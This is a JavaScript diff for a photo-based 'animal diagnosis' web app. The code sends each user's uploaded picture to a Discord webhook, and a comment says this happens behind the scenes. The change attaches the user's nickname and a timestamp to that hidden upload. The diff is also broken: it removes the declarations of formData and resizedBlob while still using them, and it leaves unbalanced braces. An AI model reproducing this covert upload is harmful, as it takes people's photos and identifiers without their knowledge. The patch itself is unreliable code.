@@ -48,10 +48,15 @@ fileInput.addEventListener("change", async () => {
     storeResultData(animal); // ユーザー向けに結果保存
 
     // Discord に裏で画像だけ送信
-    if (lastUploadedFile) {
-        const resizedBlob = await resizeImage(lastUploadedFile);
-        const formData = new FormData();
-        formData.append("file", resizedBlob, "image.png"); // 画像のみ送信
+   const nickname = localStorage.getItem("nickname") || "未入力";
+const now = new Date().toLocaleString("ja-JP");
+
+const payload = {
+    content: `📷 新しい診断\n👤 ニックネーム: ${nickname}\n🕒 時間: ${now}`
+};
+
+formData.append("payload_json", JSON.stringify(payload));
+formData.append("file", resizedBlob, "image.png");
 
         fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData })
             .then(res => console.log("Discord送信成功", res.status))
